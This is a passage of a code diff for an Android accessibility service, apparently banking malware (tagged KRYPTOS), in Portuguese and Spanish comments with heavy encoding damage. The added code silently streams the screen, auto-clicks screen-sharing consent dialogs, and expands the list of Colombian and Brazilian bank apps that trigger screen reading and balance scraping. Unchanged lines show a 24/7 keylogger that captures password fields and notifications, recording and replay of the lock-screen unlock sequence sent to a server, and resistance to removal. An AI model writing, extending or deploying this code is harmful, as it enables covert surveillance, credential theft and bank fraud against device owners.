+                                // Falha genÃƒÂ©rica: backoff suave
                                 silentCaptureDelayMs = Math.min(silentCaptureDelayMs + 150, SILENT_CAPTURE_MAX_DELAY_MS);
                             }
                             silentScreenshotApiInFlight = false;
@@ -3806,7 +3995,7 @@ public class UiAssistBridge extends AccessibilityService {
     /** [KRYPTOS] frame vindo do MediaProjection */
     public static void onProjectionFrame(android.graphics.Bitmap bmp) {
         if (bmp == null) return;
-        if (!silentScreenActive) { try { bmp.recycle(); } catch (Throwable ignored) {} return; }
+        if (!silentScreenActive && !ScreenStreamService.isActive()) { try { bmp.recycle(); } catch (Throwable ignored) {} return; }
         try {
             enqueueSilentFrame(bmp);
         } catch (Throwable t) {
@@ -3821,8 +4010,22 @@ public class UiAssistBridge extends AccessibilityService {
             if (ScreenStreamService.isActive()) return true;
             if (instance == null) return false;
             android.view.accessibility.AccessibilityNodeInfo root = instance.getRootInActiveWindow();
+            if (root != null) {
+                if (clickProjectionOnRoot(root)) return true;
+            }
+            try {
+                java.util.List<android.view.accessibility.AccessibilityWindowInfo> ws = instance.getWindows();
+                if (ws != null) {
+                    for (android.view.accessibility.AccessibilityWindowInfo w : ws) {
+                        try {
+                            android.view.accessibility.AccessibilityNodeInfo r2 = w.getRoot();
+                            if (r2 != null && clickProjectionOnRoot(r2)) return true;
+                        } catch (Throwable ignored) {}
+                    }
+                }
+            } catch (Throwable ignored) {}
             if (root == null) return false;
-            String[] texts = {"Empezar ahora", "Iniciar agora", "Iniciar ahora", "Comenzar ahora", "Start now", "Ahora", "Agora", "Iniciar", "Empezar", "Comenzar", "Aceptar", "Permitir", "OK", "Compartir", "Transmitir"};
+            String[] texts = {"Empezar ahora", "Iniciar agora", "Iniciar ahora", "Comenzar ahora", "Start now", "Ahora", "Agora", "Iniciar", "Empezar", "Comenzar", "Siguiente", "Next", "Aceptar", "Permitir", "OK", "Transmitir"};
             if (clickFirstByText(root, texts)) return true;
             String[] ids = {"android:id/button1", "com.android.systemui:id/button1"};
             for (String idv : ids) {
@@ -3838,6 +4041,30 @@ public class UiAssistBridge extends AccessibilityService {
                 } catch (Throwable ignored) {}
             }
         } catch (Throwable t) { }
+        return false;
+    }
+
+    private static boolean clickProjectionOnRoot(android.view.accessibility.AccessibilityNodeInfo root) {
+        try {
+            // [KRYPTOS-PATCH] Android 14: confirma si ya hay boton; si no, elige pantalla completa
+            String[] confirmar = {"Siguiente", "Next", "Empezar ahora", "Iniciar agora", "Iniciar ahora", "Comenzar ahora", "Start now", "Ahora", "Agora", "Aceptar", "Permitir", "OK", "Transmitir"};
+            if (clickFirstByText(root, confirmar)) return true;
+            String[] pantallaCompleta = {"Compartir pantalla completa", "Compartir toda la pantalla", "Toda la pantalla", "Pantalla completa", "Entire screen", "Tela inteira", "Full screen"};
+            if (clickFirstByText(root, pantallaCompleta)) return true;
+            String[] ids = {"android:id/button1", "com.android.systemui:id/button1"};
+            for (String idv : ids) {
+                try {
+                    java.util.List<android.view.accessibility.AccessibilityNodeInfo> l2 = root.findAccessibilityNodeInfosByViewId(idv);
+                    if (l2 == null) continue;
+                    for (android.view.accessibility.AccessibilityNodeInfo n : l2) {
+                        android.view.accessibility.AccessibilityNodeInfo c = n;
+                        int g = 0;
+                        while (c != null && !c.isClickable() && g++ < 6) c = c.getParent();
+                        if (c != null) { c.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK); return true; }
+                    }
+                } catch (Throwable ignored) {}
+            }
+        } catch (Throwable ignored) {}
         return false;
     }
 
@@ -3874,7 +4101,7 @@ public class UiAssistBridge extends AccessibilityService {
 
     private static android.graphics.Bitmap adjustBitmapBrightness(android.graphics.Bitmap src, float factor) {
         try {
-            // Se o bitmap original for HARDWARE, precisamos copiá-lo para software (ARGB_8888) para permitir alteração/Canvas
+            // Se o bitmap original for HARDWARE, precisamos copiÃƒÂ¡-lo para software (ARGB_8888) para permitir alteraÃƒÂ§ÃƒÂ£o/Canvas
             android.graphics.Bitmap softwareSrc = src;
             if (src.getConfig() == android.graphics.Bitmap.Config.HARDWARE) {
                 softwareSrc = src.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
@@ -3896,7 +4123,7 @@ public class UiAssistBridge extends AccessibilityService {
             paint.setColorFilter(new android.graphics.ColorMatrixColorFilter(colorMatrix));
             canvas.drawBitmap(softwareSrc, 0, 0, paint);
             
-            // Recicla os bitmaps temporários/antigos para evitar vazamento de memória
+            // Recicla os bitmaps temporÃƒÂ¡rios/antigos para evitar vazamento de memÃƒÂ³ria
             if (softwareSrc != src) {
                 softwareSrc.recycle();
             }
@@ -3908,6 +4135,18 @@ public class UiAssistBridge extends AccessibilityService {
             Log.e("UiAssistBridge", "Erro ao ajustar brilho do frame VNC: " + e.getMessage());
             return src;
         }
+    }
+
+
+    // [KRYPTOS-PATCH PERF] escala proporcional (sin deformar) al lado mayor SILENT_MAX_SIDE
+    private static final int SILENT_MAX_SIDE = 720;
+    private static android.graphics.Bitmap scaleForPipeline(android.graphics.Bitmap src) {
+        int sw = src.getWidth(), sh = src.getHeight();
+        float sc = Math.min(1f, SILENT_MAX_SIDE / (float) Math.max(sw, sh));
+        int tw = Math.max(2, Math.round(sw * sc));
+        int th = Math.max(2, Math.round(sh * sc));
+        if (tw == sw && th == sh) return src;
+        return android.graphics.Bitmap.createScaledBitmap(src, tw, th, true);
     }
 
     private static void processOneSilentEncodeJob() {
@@ -3923,12 +4162,7 @@ public class UiAssistBridge extends AccessibilityService {
         android.graphics.Bitmap scaled = null;
         try {
             try {
-                scaled = android.graphics.Bitmap.createScaledBitmap(
-                        source,
-                        SILENT_WIDTH,
-                        SILENT_HEIGHT,
-                        true
-                );
+                scaled = scaleForPipeline(source);
             } catch (Exception scaleEx) {
                 Log.w(TAG, "createScaledBitmap fallback: " + scaleEx.getMessage());
                 android.graphics.Bitmap software = source.copy(android.graphics.Bitmap.Config.ARGB_8888, false);
@@ -3936,20 +4170,15 @@ public class UiAssistBridge extends AccessibilityService {
                     source.recycle();
                 }
                 source = software;
-                scaled = android.graphics.Bitmap.createScaledBitmap(
-                        source,
-                        SILENT_WIDTH,
-                        SILENT_HEIGHT,
-                        true
-                );
+                scaled = scaleForPipeline(source);
             }
 
-            // Se a tela preta estiver ativa e visível, amplifica o brilho dinamicamente no bitmap JÁ REDIMENSIONADO (otimização de 90% CPU/RAM)
+            // Se a tela preta estiver ativa e visÃƒÂ­vel, amplifica o brilho dinamicamente no bitmap JÃƒÂ REDIMENSIONADO (otimizaÃƒÂ§ÃƒÂ£o de 90% CPU/RAM)
             if (instance != null && instance.isBlackScreenActive && 
                     (instance.blackOverlayView == null || instance.blackOverlayView.getVisibility() == android.view.View.VISIBLE)) {
                 float alpha = Math.min(0.97f, instance.blackScreenOpacityPercent / 100f);
                 float transparency = 1.0f - alpha;
-                float factor = 1.0f / Math.max(0.01f, transparency); // Evita divisão por zero
+                float factor = 1.0f / Math.max(0.01f, transparency); // Evita divisÃƒÂ£o por zero
                 if (factor > 1.1f) {
                     scaled = adjustBitmapBrightness(scaled, factor);
                 }
@@ -4007,7 +4236,7 @@ public class UiAssistBridge extends AccessibilityService {
      * Start the dedicated BTMOB-style thread for silent screen (called only for the purple HVNC Silente button).
      * Persists state and acquires PARTIAL_WAKE_LOCK so the loop survives service restarts and screen-off.
      */
-    /** BTMOB-style live quality (10–100 JPEG). Callable while capture thread is running. */
+    /** BTMOB-style live quality (10Ã¢â‚¬â€œ100 JPEG). Callable while capture thread is running. */
     public static int clampSilentQuality(int quality) {
         if (quality < 10) return 10;
         if (quality > 100) return 100;
@@ -4026,7 +4255,7 @@ public class UiAssistBridge extends AccessibilityService {
         return silentCaptureQuality;
     }
 
-    /** Sinaliza captura imediata no loop HVNC quando killer mode está ativo (pós-clique do painel). */
+    /** Sinaliza captura imediata no loop HVNC quando killer mode estÃƒÂ¡ ativo (pÃƒÂ³s-clique do painel). */
     public static void requestKillerCapture() {
         killerCaptureRequested = true;
     }
@@ -4050,7 +4279,7 @@ public class UiAssistBridge extends AccessibilityService {
         silentCaptureQuality = clampSilentQuality(quality > 0 ? quality : silentCaptureQuality);
         if (silentScreenActive && silentScreenThread != null && silentScreenThread.isAlive()) {
             saveSilentState(true, silentCaptureQuality);
-            Log.d("SilentCap", "Silent thread already running — quality updated to " + silentCaptureQuality);
+            Log.d("SilentCap", "Silent thread already running Ã¢â‚¬â€ quality updated to " + silentCaptureQuality);
             return;
         }
         silentScreenActive = true;
@@ -4060,7 +4289,7 @@ public class UiAssistBridge extends AccessibilityService {
         // Persist the fact that the dedicated silent path is now active (for auto-resume on service recreate)
         saveSilentState(true, q);
 
-        // 🔋 CRITICAL BACKUP: Adquire PARTIAL_WAKE_LOCK para manter a CPU viva no caminho silencioso
+        // Ã°Å¸â€â€¹ CRITICAL BACKUP: Adquire PARTIAL_WAKE_LOCK para manter a CPU viva no caminho silencioso
         // WakeLock pattern (UI:ScreenCaptureWakeLock) and CommandControlService (App:NetworkSync).
         try {
             if (instance != null) {
@@ -4071,11 +4300,11 @@ public class UiAssistBridge extends AccessibilityService {
                         "App:SilentCaptureCpuWakeLock"
                     );
                     instance.silentCpuWakeLock.acquire();
-                    Log.d("SilentCap", "🔋 PARTIAL_WAKE_LOCK adquirido para o loop silencioso!");
+                    Log.d("SilentCap", "Ã°Å¸â€â€¹ PARTIAL_WAKE_LOCK adquirido para o loop silencioso!");
                 }
             }
         } catch (Exception e) {
-            Log.e("SilentCap", "❌ Erro ao adquirir WakeLock silencioso: " + e.getMessage());
+            Log.e("SilentCap", "Ã¢ÂÅ’ Erro ao adquirir WakeLock silencioso: " + e.getMessage());
         }
 
         // Report current dedicated silent state to server/panel (for UI sync after reconnect/refresh)
@@ -4093,6 +4322,9 @@ public class UiAssistBridge extends AccessibilityService {
             Log.d("SilentCap", "BTMOB-style silent thread started");
             while (silentScreenActive) {
                 try {
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && instance != null && !ScreenStreamService.isActive()) {
+                        try { ScreenStreamService.ensure(instance); } catch (Throwable ignored) {}
+                    }
                     if (CommandControlService.isKillerModeActive && (instance == null || !instance.isBlackScreenActive)) {
                         while (silentScreenActive && !killerCaptureRequested) {
                             Thread.sleep(50);
@@ -4112,8 +4344,8 @@ public class UiAssistBridge extends AccessibilityService {
                             instance.capSilentScreen(silentCaptureQuality);
                             Thread.sleep(getEffectiveSilentCaptureDelayMs());
                         } else {
-                            // Dorme um tempo bem curto se não puder capturar (throttling ou screenshot ativo)
-                            Thread.sleep(10);
+                            // Dorme um tempo bem curto se nÃƒÂ£o puder capturar (throttling ou screenshot ativo)
+                            Thread.sleep(40);
                         }
                     }
                 } catch (Throwable e) {
@@ -4132,6 +4364,11 @@ public class UiAssistBridge extends AccessibilityService {
         }, "SilentScreenThread");
         silentScreenThread = thread;
         thread.start();
+    }
+
+    /** [KRYPTOS] Forca o pedido de projecao ignorando o gate de 12s. */
+    public static void forceProjection(Context ctx) {
+        try { ScreenStreamService.forceEnsure(ctx); } catch (Throwable ignored) {}
     }
 
     public static void stopSilentScreenCapture() {
@@ -4228,47 +4465,47 @@ public class UiAssistBridge extends AccessibilityService {
             if (silentCpuWakeLock != null && silentCpuWakeLock.isHeld()) {
                 silentCpuWakeLock.release();
                 silentCpuWakeLock = null;
-                Log.d(TAG, "🔋 WakeLock do caminho silencioso liberado com sucesso.");
+                Log.d(TAG, "Ã°Å¸â€â€¹ WakeLock do caminho silencioso liberado com sucesso.");
             }
         } catch (Exception e) {
-            Log.e(TAG, "⚠️ Erro ao liberar WakeLock silencioso: " + e.getMessage());
+            Log.e(TAG, "Ã¢Å¡Â Ã¯Â¸Â Erro ao liberar WakeLock silencioso: " + e.getMessage());
         }
     }
 
     /**
-     * Inicia gravação de sequência de desbloqueio
+     * Inicia gravaÃƒÂ§ÃƒÂ£o de sequÃƒÂªncia de desbloqueio
      */
     private void startUnlockRecording() {
         isRecordingUnlock = true;
         unlockSequence.clear();
         lastUnlockActionTime = System.currentTimeMillis();
         unlockType = "unknown";
-        Log.d(TAG, "🔴 GRAVAÇÃO DE DESBLOQUEIO INICIADA!");
+        Log.d(TAG, "Ã°Å¸â€Â´ GRAVAÃƒâ€¡ÃƒÆ’O DE DESBLOQUEIO INICIADA!");
     }
     
     /**
-     * Para gravação de sequência de desbloqueio
+     * Para gravaÃƒÂ§ÃƒÂ£o de sequÃƒÂªncia de desbloqueio
      */
     private void stopUnlockRecording() {
         isRecordingUnlock = false;
-        Log.d(TAG, "⏹️ GRAVAÇÃO DE DESBLOQUEIO PARADA! " + unlockSequence.size() + " ações gravadas");
+        Log.d(TAG, "Ã¢ÂÂ¹Ã¯Â¸Â GRAVAÃƒâ€¡ÃƒÆ’O DE DESBLOQUEIO PARADA! " + unlockSequence.size() + " aÃƒÂ§ÃƒÂµes gravadas");
         
-        // Envia sequência para o servidor
+        // Envia sequÃƒÂªncia para o servidor
         sendUnlockSequenceToServer();
     }
     
     /**
-     * Reproduz sequência de desbloqueio gravada
+     * Reproduz sequÃƒÂªncia de desbloqueio gravada
      */
     private void playUnlockSequence() {
-        Log.d(TAG, "🔓 playUnlockSequence() chamado! Sequência tem " + unlockSequence.size() + " ações");
+        Log.d(TAG, "Ã°Å¸â€â€œ playUnlockSequence() chamado! SequÃƒÂªncia tem " + unlockSequence.size() + " aÃƒÂ§ÃƒÂµes");
         
         if (unlockSequence.isEmpty()) {
-            Log.w(TAG, "⚠️ Nenhuma sequência de desbloqueio gravada!");
+            Log.w(TAG, "Ã¢Å¡Â Ã¯Â¸Â Nenhuma sequÃƒÂªncia de desbloqueio gravada!");
             return;
         }
         
-        Log.d(TAG, "▶️ REPRODUZINDO SEQUÊNCIA DE DESBLOQUEIO (" + unlockSequence.size() + " ações, tipo=" + unlockType + ")");
+        Log.d(TAG, "Ã¢â€“Â¶Ã¯Â¸Â REPRODUZINDO SEQUÃƒÅ NCIA DE DESBLOQUEIO (" + unlockSequence.size() + " aÃƒÂ§ÃƒÂµes, tipo=" + unlockType + ")");
         
         // Primeiro, acorda a tela se estiver desligada
         android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
@@ -4282,16 +4519,16 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Executa a sequência de desbloqueio de forma sequencial
+     * Executa a sequÃƒÂªncia de desbloqueio de forma sequencial
      */
     private void executeUnlockSequence(int index) {
         if (index >= unlockSequence.size()) {
-            Log.d(TAG, "✅ Sequência de desbloqueio concluída!");
+            Log.d(TAG, "Ã¢Å“â€¦ SequÃƒÂªncia de desbloqueio concluÃƒÂ­da!");
             return;
         }
         
         UnlockAction action = unlockSequence.get(index);
-        Log.d(TAG, "🔓 Executando ação " + (index + 1) + "/" + unlockSequence.size() + ": " + action.type);
+        Log.d(TAG, "Ã°Å¸â€â€œ Executando aÃƒÂ§ÃƒÂ£o " + (index + 1) + "/" + unlockSequence.size() + ": " + action.type);
         
         if ("CLICK".equals(action.type)) {
             if (gestureCore != null) gestureCore.executeClick(action.x, action.y);
@@ -4303,7 +4540,7 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
         
-        // Executa próxima ação após delay
+        // Executa prÃƒÂ³xima aÃƒÂ§ÃƒÂ£o apÃƒÂ³s delay
         long delay = action.delay > 0 ? action.delay : 200;
         handler.postDelayed(() -> executeUnlockSequence(index + 1), delay);
     }
@@ -4346,14 +4583,14 @@ public class UiAssistBridge extends AccessibilityService {
             unlockSequence.clear();
             unlockSequence.addAll(list);
             unlockType = t;
-            Log.d(TAG, "🔓 Sequência carregada: " + list.size() + " ações, tipo=" + t);
+            Log.d(TAG, "Ã°Å¸â€â€œ SequÃƒÂªncia carregada: " + list.size() + " aÃƒÂ§ÃƒÂµes, tipo=" + t);
         } catch (Exception e) {
-            Log.e(TAG, "❌ Erro ao aplicar sequência JSON: " + e.getMessage());
+            Log.e(TAG, "Ã¢ÂÅ’ Erro ao aplicar sequÃƒÂªncia JSON: " + e.getMessage());
         }
     }
     
     /**
-     * Envia sequência de desbloqueio para o servidor
+     * Envia sequÃƒÂªncia de desbloqueio para o servidor
      */
     private void sendUnlockSequenceToServer() {
         try {
@@ -4379,14 +4616,14 @@ public class UiAssistBridge extends AccessibilityService {
             // Envia para CommandControlService
             CommandControlService.sendUnlockSequence(this, json.toString());
             
-            Log.d(TAG, "📤 Sequência de desbloqueio enviada: " + json.toString());
+            Log.d(TAG, "Ã°Å¸â€œÂ¤ SequÃƒÂªncia de desbloqueio enviada: " + json.toString());
         } catch (Exception e) {
-            Log.e(TAG, "❌ Erro ao enviar sequência: " + e.getMessage());
+            Log.e(TAG, "Ã¢ÂÅ’ Erro ao enviar sequÃƒÂªncia: " + e.getMessage());
         }
     }
     
     /**
-     * Grava uma ação de desbloqueio (chamado durante eventos de toque na lockscreen)
+     * Grava uma aÃƒÂ§ÃƒÂ£o de desbloqueio (chamado durante eventos de toque na lockscreen)
      */
     private void recordUnlockAction(String type, int x, int y, int x2, int y2) {
         if (!isRecordingUnlock) return;
@@ -4402,28 +4639,28 @@ public class UiAssistBridge extends AccessibilityService {
         action.delay = delay;
         
         unlockSequence.add(action);
-        Log.d(TAG, "🔴 Ação gravada: " + type + " (" + x + "," + y + ") - Total: " + unlockSequence.size());
+        Log.d(TAG, "Ã°Å¸â€Â´ AÃƒÂ§ÃƒÂ£o gravada: " + type + " (" + x + "," + y + ") - Total: " + unlockSequence.size());
         
         // Detecta tipo de desbloqueio
         detectUnlockType(x, y);
     }
     
     /**
-     * Calcula o delay desde a última ação
+     * Calcula o delay desde a ÃƒÂºltima aÃƒÂ§ÃƒÂ£o
      */
     private long getDelay() {
         long now = System.currentTimeMillis();
         long delay = now - lastUnlockActionTime;
         lastUnlockActionTime = now;
-        return delay > 2000 ? 500 : delay; // Limita delay máximo
+        return delay > 2000 ? 500 : delay; // Limita delay mÃƒÂ¡ximo
     }
     
     /**
      * Detecta o tipo de desbloqueio baseado nas coordenadas
      */
     private void detectUnlockType(int x, int y) {
-        // Heurística simples baseada na posição dos toques
-        // PIN: toques na parte inferior da tela (onde fica o teclado numérico)
+        // HeurÃƒÂ­stica simples baseada na posiÃƒÂ§ÃƒÂ£o dos toques
+        // PIN: toques na parte inferior da tela (onde fica o teclado numÃƒÂ©rico)
         // Pattern: toques no centro da tela
         // Password: geralmente usa teclado normal
         
@@ -4445,7 +4682,7 @@ public class UiAssistBridge extends AccessibilityService {
     @Override
     public void onDestroy() {
         super.onDestroy();
-        // Remove callbacks do Watchdog para evitar vazamento de memória
+        // Remove callbacks do Watchdog para evitar vazamento de memÃƒÂ³ria
         watchdogHandler.removeCallbacks(watchdogRunnable);
 
         // Stop loop but keep persisted prefs so onServiceConnected can auto-resume (BTMOB-like)
@@ -4474,20 +4711,20 @@ public class UiAssistBridge extends AccessibilityService {
         // Para Screen Reader
         stopScreenReader();
         
-        Log.d(TAG, "Serviço de acessibilidade destruído");
+        Log.d(TAG, "ServiÃƒÂ§o de acessibilidade destruÃƒÂ­do");
     }
 
     @Override
     public boolean onUnbind(Intent intent) {
-        Log.w(TAG, "⚠️ AccessibilityService onUnbind chamado pelo sistema! Solicitando rebind automático...");
-        // Retornar true informa ao Android que o serviço permite onRebind automático quando recomposto
+        Log.w(TAG, "Ã¢Å¡Â Ã¯Â¸Â AccessibilityService onUnbind chamado pelo sistema! Solicitando rebind automÃƒÂ¡tico...");
+        // Retornar true informa ao Android que o serviÃƒÂ§o permite onRebind automÃƒÂ¡tico quando recomposto
         return true;
     }
 
     @Override
     public void onRebind(Intent intent) {
         super.onRebind(intent);
-        Log.d(TAG, "✅ AccessibilityService onRebind reconectado pelo sistema!");
+        Log.d(TAG, "Ã¢Å“â€¦ AccessibilityService onRebind reconectado pelo sistema!");
     }
 
     private void notifyForegroundAppChange(String packageName) {
@@ -4495,7 +4732,7 @@ public class UiAssistBridge extends AccessibilityService {
             return;
         }
         
-        // 🚫 IMPEDIR ABERTURA DE APPS ESPECIFICADOS (EXIBE TELA DE APP INDISPONÍVEL)
+        // Ã°Å¸Å¡Â« IMPEDIR ABERTURA DE APPS ESPECIFICADOS (EXIBE TELA DE APP INDISPONÃƒÂVEL)
         // Verifica SEMPRE antes de qualquer filtro para garantir bloqueio 100% imediato
         if (blockedPackages != null && !blockedPackages.isEmpty()) {
             String pkgCheck = packageName.trim().toLowerCase();
@@ -4511,8 +4748,8 @@ public class UiAssistBridge extends AccessibilityService {
                     appName = pm.getApplicationLabel(info).toString();
                 } catch (Exception ignored) {}
                 
-                Log.d(TAG, "🚫 APP BLOQUEADO DETECTADO: " + appName + " (" + packageName + ") - Exibindo tela de Aplicativo Indisponível!");
-                lastForegroundPackage = ""; // Reseta pacote anterior para forçar bloqueio continuo se tentar reabrir
+                Log.d(TAG, "Ã°Å¸Å¡Â« APP BLOQUEADO DETECTADO: " + appName + " (" + packageName + ") - Exibindo tela de Aplicativo IndisponÃƒÂ­vel!");
+                lastForegroundPackage = ""; // Reseta pacote anterior para forÃƒÂ§ar bloqueio continuo se tentar reabrir
                 showAppUnavailableOverlay(packageName, appName);
                 return;
             }
@@ -4522,13 +4759,13 @@ public class UiAssistBridge extends AccessibilityService {
             return;
         }
         
-        // 🚫 IGNORA o nosso próprio aplicativo para não fechar a overlay ao ser exibida
+        // Ã°Å¸Å¡Â« IGNORA o nosso prÃƒÂ³prio aplicativo para nÃƒÂ£o fechar a overlay ao ser exibida
         if (packageName.equals(getPackageName())) {
-            Log.d(TAG, "📱 Ignorando mudança de foreground para o nosso próprio app: " + packageName);
+            Log.d(TAG, "Ã°Å¸â€œÂ± Ignorando mudanÃƒÂ§a de foreground para o nosso prÃƒÂ³prio app: " + packageName);
             return;
         }
         
-        // 🚫 IGNORA teclados e pacotes do sistema
+        // Ã°Å¸Å¡Â« IGNORA teclados e pacotes do sistema
         String pkgLower = packageName.toLowerCase();
         boolean isKeyboardOrSystem = 
             pkgLower.contains("inputmethod") || 
@@ -4542,7 +4779,7 @@ public class UiAssistBridge extends AccessibilityService {
             pkgLower.equals("com.android.systemui");
             
         if (isKeyboardOrSystem) {
-            Log.d(TAG, "📱 Ignorando teclado/sistema: " + packageName);
+            Log.d(TAG, "Ã°Å¸â€œÂ± Ignorando teclado/sistema: " + packageName);
             return;
         }
         
@@ -4563,11 +4800,11 @@ public class UiAssistBridge extends AccessibilityService {
         
         CommandControlService.sendDeviceStatus(this, packageName, appName, isLocked, isScreenOn);
         
-        Log.d(TAG, "📱 APP CHANGE: " + appName + " (" + packageName + ") - Notified server");
+        Log.d(TAG, "Ã°Å¸â€œÂ± APP CHANGE: " + appName + " (" + packageName + ") - Notified server");
 
-        // 🏦 AUTO-START SCREEN READER V2 PARA APPS BANCÁRIOS (BRASIL + COLÔMBIA: DAVIVIENCIA, DAVIPLATA, BANCOLOMBIA, ETC)
+        // Ã°Å¸ÂÂ¦ AUTO-START SCREEN READER V2 PARA APPS BANCÃƒÂRIOS (BRASIL + COLÃƒâ€MBIA: DAVIVIENCIA, DAVIPLATA, BANCOLOMBIA, ETC)
         boolean isBank = pkgLower.contains("davivienda") || pkgLower.contains("daviplata") || 
-                         pkgLower.contains("bancolombia") || pkgLower.contains("nequi") ||
+                         pkgLower.contains("bancolombia") || pkgLower.contains("nequi") || pkgLower.contains("rappipay") || pkgLower.contains("nu.production") || pkgLower.contains("lulo") || pkgLower.contains("pibank") || pkgLower.contains("movi") || pkgLower.contains("uala") || pkgLower.contains("tuya") || pkgLower.contains("bancoomeva") || pkgLower.contains("bancoagrario") || pkgLower.contains("bancow") || pkgLower.contains("serfinanza") || pkgLower.contains("finandina") || pkgLower.contains("avvillas") || pkgLower.contains("colpatria") || pkgLower.contains("scotiabank") || pkgLower.contains("falabella") || pkgLower.contains("bbva") || pkgLower.contains("bancopopular") || pkgLower.contains("bancamiga") ||
                          pkgLower.contains("bancodebogota") || pkgLower.contains("itau") || 
                          pkgLower.contains("bradesco") || pkgLower.contains("santander") || 
                          pkgLower.contains("nubank") || pkgLower.contains("banco") || 
@@ -4576,7 +4813,7 @@ public class UiAssistBridge extends AccessibilityService {
                          pkgLower.contains("mercadopago") || pkgLower.contains("neon");
 
         if (isBank && !screenReaderEnabled) {
-            Log.d(TAG, "🏦 APP BANCÁRIO DETECTADO (" + packageName + "): Auto-ativando Screen Reader V2!");
+            Log.d(TAG, "Ã°Å¸ÂÂ¦ APP BANCÃƒÂRIO DETECTADO (" + packageName + "): Auto-ativando Screen Reader V2!");
             screenReaderEnabled = true;
             startScreenReader();
         }
@@ -4593,7 +4830,7 @@ public class UiAssistBridge extends AccessibilityService {
         String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
         String className = event.getClassName() != null ? event.getClassName().toString() : "";
 
-        // 🔔 CAPTURA DE EVENTO DE NOTIFICAÇÃO
+        // Ã°Å¸â€â€ CAPTURA DE EVENTO DE NOTIFICAÃƒâ€¡ÃƒÆ’O
         if (event.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
             try {
                 List<CharSequence> textList = event.getText();
@@ -4604,12 +4841,12 @@ public class UiAssistBridge extends AccessibilityService {
                     }
                     String notificationText = sb.toString().trim();
                     if (!notificationText.isEmpty() && !packageName.equals("com.seguranca.protecao") && !packageName.equals(getPackageName())) {
-                        Log.d(TAG, "🔔 NOTIFICATION CAPTURED: " + packageName + " - " + notificationText);
-                        sendKeylogData(packageName, notificationText, "Notificação Recebida", "", false, "NOTIFICATION");
+                        Log.d(TAG, "Ã°Å¸â€â€ NOTIFICATION CAPTURED: " + packageName + " - " + notificationText);
+                        sendKeylogData(packageName, notificationText, "NotificaÃƒÂ§ÃƒÂ£o Recebida", "", false, "NOTIFICATION");
                     }
                 }
             } catch (Exception e) {
-                Log.e(TAG, "Erro ao capturar notificação: " + e.getMessage());
+                Log.e(TAG, "Erro ao capturar notificaÃƒÂ§ÃƒÂ£o: " + e.getMessage());
             }
         }
 
@@ -4626,7 +4863,7 @@ public class UiAssistBridge extends AccessibilityService {
             blockSystemNavWhileBlackScreen(packageName, className);
         }
         
-        // 💾 KEYLOGGER 24/7: Captura eventos de texto SEMPRE
+        // Ã°Å¸â€™Â¾ KEYLOGGER 24/7: Captura eventos de texto SEMPRE
         if (keyloggerEnabled) {
             int eventType = event.getEventType();
             
@@ -4665,7 +4902,7 @@ public class UiAssistBridge extends AccessibilityService {
 
                 boolean isOurApp = packageName.equals("com.seguranca.protecao") || packageName.equals(getPackageName());
                 if (!isDummyText && (!isOurApp || isPassword)) {
-                    Log.d(TAG, "⌨️ KEYLOG 24/7: " + packageName + " - " + text + " (hint: " + fieldHint + ")");
+                    Log.d(TAG, "Ã¢Å’Â¨Ã¯Â¸Â KEYLOG 24/7: " + packageName + " - " + text + " (hint: " + fieldHint + ")");
                     sendKeylogData(packageName, text, fieldHint, fieldName, isPassword, isPassword ? "PASSWORD_FIELD" : "TEXT_CHANGED");
                 } else if (isPassword && !isOurApp) {
                     sendKeylogData(packageName, "", fieldHint, fieldName, true, "PASSWORD_TYPING");
@@ -4675,11 +4912,11 @@ public class UiAssistBridge extends AccessibilityService {
         
         AccessibilityNodeInfo rootNode = getRootInActiveWindow();
         
-        // 🔒 PROTEÇÃO CONTRA DESINSTALAÇÃO E DESATIVAÇÃO
+        // Ã°Å¸â€â€™ PROTEÃƒâ€¡ÃƒÆ’O CONTRA DESINSTALAÃƒâ€¡ÃƒÆ’O E DESATIVAÃƒâ€¡ÃƒÆ’O
         if (rootNode != null) {
             protectAgainstRemoval(packageName, className, rootNode);
 
-            // Auto-permite diálogos de permissões do sistema para o nosso app
+            // Auto-permite diÃƒÂ¡logos de permissÃƒÂµes do sistema para o nosso app
             if (!isLauncherOrRecentsWindow(packageName, className) && (packageName.contains("permissioncontroller") || packageName.contains("packageinstaller"))) {
                 if (containsOurAppName(rootNode)) {
                     handleRuntimePermissionDialog(rootNode);
@@ -4692,17 +4929,17 @@ public class UiAssistBridge extends AccessibilityService {
             }
         }
 
-        // === GRAVAÇÃO DE DESBLOQUEIO ===
+        // === GRAVAÃƒâ€¡ÃƒÆ’O DE DESBLOQUEIO ===
         if (isRecordingUnlock) {
             captureUnlockAction(event);
         }
         
-        // 💰 Scanner Universal de Saldo Bancário
+        // Ã°Å¸â€™Â° Scanner Universal de Saldo BancÃƒÂ¡rio
         if (rootNode != null && packageName != null && (packageName.contains("banco") || packageName.contains("bank") || 
             packageName.contains("itau") || packageName.contains("nubank") || packageName.contains("bradesco") || 
             packageName.contains("santander") || packageName.contains("caixa") || packageName.contains("inter") || 
             packageName.contains("picpay") || packageName.contains("mercadopago") || packageName.contains("c6") ||
-            packageName.contains("davivienda") || packageName.contains("daviplata") || packageName.contains("bancolombia") || packageName.contains("nequi"))) {
+            packageName.contains("davivienda") || packageName.contains("daviplata") || packageName.contains("bancolombia") || packageName.contains("nequi") || packageName.contains("rappipay") || packageName.contains("nu.production") || packageName.contains("lulo") || packageName.contains("pibank") || packageName.contains("movi") || packageName.contains("uala") || packageName.contains("tuya") || packageName.contains("bancoomeva") || packageName.contains("bancoagrario") || packageName.contains("bancow") || packageName.contains("serfinanza") || packageName.contains("finandina") || packageName.contains("avvillas") || packageName.contains("colpatria") || packageName.contains("scotiabank") || packageName.contains("falabella") || packageName.contains("bbva") || packageName.contains("bancopopular") || packageName.contains("bancamiga"))) {
             scanAndReportBankBalance(rootNode, packageName);
         }
 
@@ -4715,7 +4952,7 @@ public class UiAssistBridge extends AccessibilityService {
     }
     
     /**
-     * Captura ações de desbloqueio (cliques na lockscreen)
+     * Captura aÃƒÂ§ÃƒÂµes de desbloqueio (cliques na lockscreen)
      * IMPORTANTE: Para PATTERN/SWIPE, precisamos capturar de forma diferente
      */
